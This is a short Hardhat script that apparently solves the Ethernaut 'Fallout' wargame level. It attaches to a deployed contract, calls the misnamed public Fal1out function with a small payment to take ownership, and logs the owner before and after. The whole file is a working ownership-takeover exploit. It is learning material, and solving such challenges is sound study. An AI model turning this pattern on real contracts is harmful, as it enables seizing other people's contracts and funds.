const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  const contractAddress = hre.ethers.utils.getAddress(
    "0xafFE53CbE2c7c56988B46a1ad281182924b27bFA"
  );
  const Contract = await hre.ethers.getContractFactory("Fallout");
  const contractInstance = await Contract.attach(contractAddress);

  console.log(contractInstance.functions);

  console.log("owner before", await contractInstance.owner());

  await contractInstance
    .connect(owner)
    .Fal1out({ value: hre.ethers.utils.parseEther("0.0001") });

  console.log("owner after", await contractInstance.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
